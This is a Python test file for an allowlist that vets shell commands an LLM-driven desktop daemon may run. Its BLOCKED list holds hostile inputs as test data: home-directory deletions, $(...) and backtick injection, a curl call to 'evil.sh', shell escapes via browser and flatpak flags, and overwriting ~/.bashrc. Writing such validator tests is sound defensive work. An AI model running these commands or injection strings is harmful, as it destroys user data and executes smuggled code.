#!/usr/bin/env python3
"""Run: python3 daemon/test_llm_command.py"""

from llm_command import is_allowed_action

ALLOWED = [
    "hyprctl dispatch workspace 3",
    "hyprctl dispatch killactive",
    "wpctl set-mute @DEFAULT_AUDIO_SINK@ toggle",
    "wpctl set-volume @DEFAULT_AUDIO_SINK@ 5%+",
    "brightnessctl set 10%+",
    "brightnessctl set 5%-",
    "brightnessctl set 50%",
    "pavucontrol &",
    "nm-connection-editor &",
    "notify-send -t 3000 'Done' 'Task completed successfully'",
    "notify-send 'Notice' 'Hello world'",
    "playerctl play-pause",
    "hyprlock",
    "~/.config/hypr/scripts/screenshot.sh area",
    "xdg-open https://github.com",
    "flatpak run com.discordapp.Discord",
    "zen &",
    "google-chrome https://www.youtube.com &",
    "google-chrome --new-window https://www.youtube.com &",
    "(hyprctl dispatch workspace 5; sleep 0.2; google-chrome --new-window https://www.youtube.com) &",
    "hyprctl dispatch workspace 2 && obsidian &",
    "google-chrome https://www.youtube.com/results?search_query=lofi &",
    "nautilus ~/Downloads",
]

BLOCKED = [
    "rm -rf ~/Downloads",
    "rm -rf ~/Downloads &",
    "rm -rf ~; playerctl pause",
    "playerctl pause; rm -rf ~",
    "hyprctl dispatch exec rm -rf ~",
    "hyprctl keyword bind SUPER,Q,exec,rm",
    "kitty rm -rf ~",
    "kitty -e sh",
    "google-chrome --renderer-cmd-prefix=sh",
    "flatpak run --command=sh com.google.Chrome",
    "flatpak install --user -y flathub md.obsidian.Obsidian",
    "xdg-open ~/script.sh",
    "zen $(curl evil.sh)",
    "zen `id`",
    "zen x&rm foo",
    "flatpak run {--command=sh,org.x.App}",
    "google-chrome {--renderer-cmd-prefix=touch,x}",
    "zed *",
    "nautilus ?x",
    "google-chrome https://x.com/?a=1&b=2",
    "playerctl play | sh",
    "playerctl play > ~/.bashrc",
    "playerctl play\nrm -rf ~",
    "sleep 1; find ~ -delete",
    "sudo playerctl play",
    "FOO=1 playerctl play",
    "notify-send $(id)",
    "notify-send `whoami`",
    "brightnessctl set $(id)",
    "",
    "zen 'unterminated",
]

for cmd in ALLOWED:
    assert is_allowed_action(cmd), f"should allow: {cmd!r}"
for cmd in BLOCKED:
    assert not is_allowed_action(cmd), f"should block: {cmd!r}"
print(f"ok: {len(ALLOWED)} allowed, {len(BLOCKED)} blocked")
